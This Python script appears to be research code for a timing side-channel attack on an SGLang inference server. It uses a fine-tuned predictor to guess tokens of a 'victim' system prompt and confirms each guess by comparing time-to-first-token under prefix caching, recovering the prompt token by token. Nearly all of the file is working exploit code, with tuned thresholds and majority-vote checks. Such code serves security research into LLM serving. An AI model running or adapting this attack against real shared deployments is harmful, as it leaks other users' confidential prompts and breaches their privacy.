import torch
import torch.nn.functional as F
from datasets import load_dataset
from transformers import pipeline, AutoTokenizer, AutoModelForCausalLM
import random
import re
import numpy as np
from tqdm import tqdm, trange
import pickle
from collections import Counter
import sys

import time
import argparse
import requests
import json

#
# The voltage and Power change will simply introduce great noise to the system, therefore break our system.
# To make our attack more robust, we choose to use average check method. However, this can't be discussed in our paper, as it is my own practical experiences. 
# Academicas might call it dirty work and refuse to reconginze it.
# 

parser = argparse.ArgumentParser(description='parser')
parser.add_argument('-m', '--model_file', type=str, default="YOUR_OWN_PATH_TO_FINE_TUNED_MODEL")
parser.add_argument('-td', '--testdataset', type=str, default="YOUR_OWN_PATH_TO_TEST_DATASET.pkl")
parser.add_argument('-r', '--result', type=str, default="YOUR_OWN_RESULT_PATH")
parser.add_argument('-p', '--pace', type=int, default=1)
parser.add_argument('-s', '--start', type=int, default=3)
parser.add_argument('-tk', '--tokenizer', type=str, default="TOKENIZER_OF_YOUR_FINE_TUNED_MODEL")
args = parser.parse_args()

# TODO:
# DOWNLOAD THE MODEL FIRST, PLEASE CHANGE IT TO THE MODEL PATH
# ===============================================================
# Assume the Oracle has already been trained.

# LLaMA-2-7B, LLaMA-2-13B, LLaMA-2-70B-GPTQ will use the same tokenizer.
# It is important (but not so important) that we should use the same tokenizer in the model, and in the predictor.
#
# If the tokenizer of the predictor is more advanced, like LLaMA-3, which can express one complete sentence in less tokens than LLaMA-2, the differences of the average will be more pronouced.
# However, it the tokenizer of the predictor is less advanced, the predictor token won't introduce the differences to the prompts, this will be bad.
model_name = args.model_file
test_dataset = args.testdataset
result_file = args.result
pace = args.pace
# Assume the attacker already know sth about the system prompt.
start = args.start
startbase = start
# It is important to use add_prefix_space=False here, or we won't keep the space, which is bad for prediction of the next token, i.e. token-by-token recovery.
tokenizer = AutoTokenizer.from_pretrained(args.tokenizer)
 

device = torch.device("cuda:0")

model = AutoModelForCausalLM.from_pretrained(model_name).to(device)
#tokenizer = AutoTokenizer.from_pretrained(model_name)

def process_string(input_str):
    pattern = r'\s*\w+|\s*[,.]'
    
    result_list = re.findall(pattern, input_str)
    
    return result_list

# predict next token of the prompt for at most num cases.
def next_token_gpt(prompt):
    # Encode input text
    input_ids = tokenizer.encode(prompt, return_tensors='pt')

    input_ids = input_ids.to(device)
    # Get model outputs
    outputs = model(input_ids)

    next_token_logits = outputs.logits[:, -1, :]

    # Convert logits to probabilities
    next_token_probs = F.softmax(next_token_logits, dim=-1)

    all_token_ids = torch.arange(next_token_probs.size(-1))
    
    all_token_probs = next_token_probs.squeeze().tolist()

    all_tokens = [tokenizer.decode([token_id]) for token_id in all_token_ids]
    
    return all_token_probs, all_tokens


# the history here is a dictionary that store the current prefix test history on the miss time.
def temperature_scaling(token_probs, temper, adjust, penalty):
    adjust_tokens = Counter(adjust)
    # print(f'adjust_tokens info: {adjust_tokens}')
    for key, value in adjust_tokens.items():
        for _ in range(value):
            token_probs[key[0]] /= penalty
    
    # Convert to logits
    logits = np.log(token_probs)
    
    # Apply temperature scaling
    scaled_logits = logits / temper
    
    # Convert back to probabilities
    scaled_probs = np.exp(scaled_logits)
    
    # Normalize to ensure the sum is 1
    scaled_probs /= np.sum(scaled_probs)

    return scaled_probs


def selected(scaled_probs):
    options = np.arange(len(scaled_probs))

    choice = np.random.choice(options, p=scaled_probs)

    return choice


def adjust_prob(tokens_prob, temper, hist_dict, pos, log, penalty_table):
    # according to pos, select log and penalty from hist_dict and penalty_table.
    
    # select log that is the same length to (pos + 1) from hist_dict
    
    # first filter with length. second filter with log.
    adjust = dict(map(lambda x: (x[0][pos:pos + 1], x[1]), dict(filter(lambda x: tuple(log) == x[0][:pos], dict(filter(lambda x: len(x[0]) == pos + 1, hist_dict.items())).items())).items()))
    
    # print(f'adjust: {adjust}')
    tokens_prob = temperature_scaling(tokens_prob, temper, adjust, penalty_table[pos])

    return tokens_prob

def forward(prefix, pace, history, temper, penalty_table):
    # New log for this pace
    log = []
    log_token = ""
    bad_tokens1 = ""
    bad_tokens2 = ""
    print(f'prefix: {prefix}\n')
    pref = prefix
    for i in range(pace):
        # print(f'i: {i}')
        # generate next token.
        tokens_prob, tokens = next_token_gpt(pref)
        
        # Adjust the probs based on the history.
        hist_dict = Counter(history)
        
        tokens_prob = adjust_prob(tokens_prob, temper, hist_dict, i, log, penalty_table)

        # select the first token
        # The choice will be used as our predicated token.
        choice = selected(tokens_prob)

        # select a statiscally miss token, from the least probability that the tokenizer will get.
        choices = np.argsort(tokens_prob)
        bad_choice1 = choices[0]
        bad_choice2 = choices[1]

        # new_token for the first token
        new_token = tokens[choice]
        bad_token1 = tokens[bad_choice1]
        bad_token2 = tokens[bad_choice2]

        pref = pref + new_token

        log.append(choice)
        log_token += new_token
        bad_tokens1 += bad_token1
        bad_tokens2 += bad_token2

    return log, log_token, bad_tokens1, bad_tokens2

# To record the data.
# flush the cache of sglang.
def flush_cache():
    response = requests.get("http://localhost:54321/flush_cache")

# Evict Funtion will soon provided here.
# We will first make sure the flush_cache can work.
# These two won't have great differences.

# As soon as the first token is not blank.
def get_ttft(text):
    start_time = time.perf_counter()
    response = requests.post(
        "http://localhost:54321/generate",
        json={
            "text": text,
            "sampling_params": {
                "temperature": 0,
                "max_new_tokens": 1,
            },
        },
        # Instructs the HTTP client to handle the server's response as a stream.
        stream=True,
    )

    for line in response.iter_lines():
        if line:  
            end_time = time.perf_counter()
            break

    ttft = end_time - start_time
    return ttft

def complete(text):
    response = requests.post(
        "http://localhost:54321/generate",
        json={
            "text": text,
            "sampling_params": {
                "temperature": 0,
                "max_new_tokens": 1,
            },
        },
        # Instructs the HTTP client to handle the server's response as a stream.
        stream=True,
    )
    # Make sure this is computed right.
    for line in response.iter_lines():
        if line:
            data = json.loads(line)
            if data.get("end_of_sequence", False):  # Look for the "end" marker
                end_time = time.perf_counter()
                break


# Don't have to know the oracle_ids.
# Maybe we should add some correction value to avoid system noise.
def oracle_check(seperator, prefix, log_token, triggering_prompt, bad_tokens1, bad_tokens2, check_time):
    # Add a dummy token, because in sglang source code, the RadixCache won't use the last token to match the prefix.
    # So if we don't add " a" here, we won't find the differences of the cached token in the log of the SGLang.
    # Attackers can't see the log, but attackers can test it in its own machine to figure it out.
    
    #if log_token[0] == ' ':
    #    bad_tokens1 = ' ' + bad_tokens1
    #    bad_tokens2 = ' ' + bad_tokens2

#    bad_tokens1 = "ab"
    #bad_tokens2 = "ad"

    org_prompt = seperator + prefix + " a"
    new_prompt = seperator + prefix + log_token + " a"
    # The bad_tokens might corrupt the word, so we'd better seperate it apart.
    #bad_prompt1 = seperator + prefix + bad_tokens1 + " a"
    #bad_prompt2 = seperator + prefix + bad_tokens2 + " a"

    check_result = []

    org_ttft_ret = []
    pre_ttft_ret = []
    #bad_ttft_ret_2 = []

    print(f'org_prompt: {org_prompt}\n')
    print(f'new_prompt: {new_prompt}\n')
    #print(f'bad_prompt1: {bad_prompt1}\n')
    #print(f'bad_prompt2: {bad_prompt2}\n')

    for _ in range(check_time):
        complete(triggering_prompt)
        time.sleep(0.3)
        
        pre_ttft = get_ttft(new_prompt)
        org_ttft = get_ttft(org_prompt)
        
        #bad_ttft_1 = get_ttft(bad_prompt1)
        #bad_ttft_2 = get_ttft(bad_prompt2)

        pre_ttft_ret.append(pre_ttft)
        org_ttft_ret.append(org_ttft)
        #bad_ttft_ret_2.append(bad_ttft_2)

        flush_cache()
    
    # Calculate the average value.
    for i in range(check_time):
        # if predicated prompt is much slower, than append 0 in the result.
        if pre_ttft_ret[i] - org_ttft_ret[i] > 0.0010:
            check_result.append(0)
        else:
            check_result.append(1)

    if sum(check_result) >= check_time/2:
        return True
    else:
        return False
    # Calculate the average value.
    #pre_average = sum(pre_ttft_ret)/len(pre_ttft_ret)
    #bad_1_average = sum(bad_ttft_ret_1)/len(bad_ttft_ret_1)
    #bad_2_average = sum(bad_ttft_ret_2)/len(bad_ttft_ret_2)

    #disturb = abs(bad_1_average - bad_2_average)
    #maxvalue = bad_1_average - pre_average
    #minvalue = min(bad_1_average - pre_average, bad_2_average - pre_average)
    #print(f"pre_average: {pre_average} bad_1_average: {bad_1_average} differences: {bad_1_average - pre_average}\n")
    # See the differences
    #if maxvalue > 0.0010:
    #    return True
    #else:
    #    return False

# For different prefix token length, we choose different classifier.
# return the result with FP, FN, TP times in test_time.
def test_ok(seperator, prefix, temper, test_time, oracle_ids, pace, penalty_table, triggering_prompt):
    # result: FP FN TP test_time
    result = [0, 0, 0, 0]

    count = 0
    
    # We will transfer history to Counter 
    history = []

    # scaled_tokens_prob, all_tokens = next_token_gpt(prefix)
    # tpr, fpr = tpr_fpr[pace - 1]

    check_time = 0

    if pace == 1:
        check_time = 10
    else:
        check_time = 3

    oracle_token = tokenizer.decode(oracle_ids[0])

    print(f'oracle_token: {repr(oracle_token)}\n')

    for _ in range(test_time):
        count += 1
        # print('============ Guess Time =================')
        log, log_token, bad_tokens1, bad_tokens2 = forward(prefix, pace, history, temper, penalty_table)
        history += ([tuple(log[:i+1]) for i in range(len(log))])

        # print(f'history: {history}')
        # print(f'log: {log} log_token: {log_token}')

        
        # Test for serveral times.
        # Record the time used.
        # Resampling if the ttft value is very strange. 
        print(f'log_token type: {type(log_token)} log_token: {repr(log_token)} bad_tokens1: {repr(bad_tokens1)} bad_tokens2: {repr(bad_tokens2)}\n')
        flush_cache()
    
        ret = oracle_check(seperator, prefix, log_token, triggering_prompt, bad_tokens1, bad_tokens2, check_time)
                
        if ret:
            # FP
            if oracle_token != log_token:
                # result: FP FN TP test_time
                print('############## FP ############')
                result[0] += 1
                return result, oracle_token
            else:
                print('############## TP ############')
                result[2] += 1
                result[3] = count
                return result, oracle_token
            #return count, True
        else:
            if oracle_token == log_token:
                print('############## FN ############')
                result[1] += 1
        

    # Failed to find the result in 'test_time' attempts.
    return result, oracle_token


# For different prefix token length, we choose different classifier.
def select_next(scaled_probs, temper):
    choice = selected(scaled_probs)
    
    scaled_probs = temperature_scaling(scaled_probs, temper, choice)
    
    return choice, scaled_probs


# Some basic value and settings.

# all of the parameters will be treated as hyper parameters.

# assume only if the random value selected is higher than the thres,
# can the oracle made the result right

mylist = []
with open(f"{test_dataset}", "rb") as file:
    mylist = pickle.load(file)

# thres: changed from 0.1 - 0.3
# first assume we have 500 chances to select.
# change the temperature with great variety
# at least, temperature 0.5 & 1.0 has relatively good results.
tempers = [0.5]

# select value below 4.
# step = int(sys.argv[1])

test_time = 80

# result should be stored here.
fw = open(f'{result_file}', 'wb')


# warming up

# penalt table for different guessing paces.
# We use a very simple penalty table.
# You can change this value to get a better one.
penalty_table = [1.1, 1.2, 1.3, 1.4]

# tpr/fpr from ROC curves for different diffreneces of shared tokens.
# Act as the simulator.
# tpr_fpr = [[0.56, 0.42], [0.8, 0.2], [0.83, 0.18], [0.85, 0.15]]
for d in tqdm(range(len(tempers)), desc='temper:'):
    # randomly select one of the sentences from the dataset.
    # for k in tqdm(range(10), desc='requests:'):
    for k in tqdm(range(185, 200), desc='requests:'):
        start = startbase
        victim = mylist[k]
        if victim[0] == '\n':
            victim = victim[1:]
        print(f'\n\n\nvictim:{victim}\n\n\n') 
        # triggering_prompt
        triggering_prompt = f"[INST] <<SYS>>\n{victim}\n<</SYS>>\n\nMYGO [/INST]"
        # seperator token length should be studied.
        # And considering its default configuration, we can assume it is already known to the attacker.
        seperator = "[INST] <<SYS>>\n"
        seperator_encoding = tokenizer(seperator, truncation=False, padding=False, return_tensors="pt")
        seperator_length = seperator_encoding["input_ids"].size(1)
        
        encoding = tokenizer(triggering_prompt, truncation=False, padding=False, return_tensors="pt")
        
        # Known Info by statistical method.
        known_ids = encoding["input_ids"][:, seperator_length:seperator_length + start]
        #print(f'encoding:{encoding["input_ids"]} encoding length: {encoding["input_ids"].size(1)}\n')
        #print(f'seperator_encoding:{seperator_encoding["input_ids"]} seperator length: {seperator_encoding["input_ids"].size(1)}\n')
        #print(f'known_ids: {known_ids[0]}\n')
        known_sentence = tokenizer.decode(known_ids[0])
        next_tokens_ids = encoding["input_ids"][:, seperator_length + start:seperator_length + start + pace]
        next_tokens = tokenizer.decode(next_tokens_ids[0])

        
        print(f'$$$$$$ {k} $$$$$$')

        # test the next token.
        # We first do a single step.
        whole_count = 0
        result, oracle_token = test_ok(seperator, known_sentence, tempers[d], test_time, next_tokens_ids, pace, penalty_table, triggering_prompt)
        recovery_tokens = 0
        whole_count += result[3]
        while result[2] == 1:
            recovery_tokens += 1
            known_sentence += oracle_token
            start += 1
            next_tokens_ids = encoding["input_ids"][:, seperator_length + start:seperator_length + start + pace]
            result, oracle_token = test_ok(seperator, known_sentence, tempers[d], test_time, next_tokens_ids, pace, penalty_table, triggering_prompt)
            whole_count += result[3]
        
        final_result = [recovery_tokens, whole_count]
        pickle.dump(final_result, fw)

        # print(f'result info: {result}')
        # For future work on recovering all of the tokens.
        # if result[2] == 1:
        #     known_sentence += log_token            
        #     start += pace
        # else:
        #     # print(f'{k}: end {count} here.\n')
        #     break

 
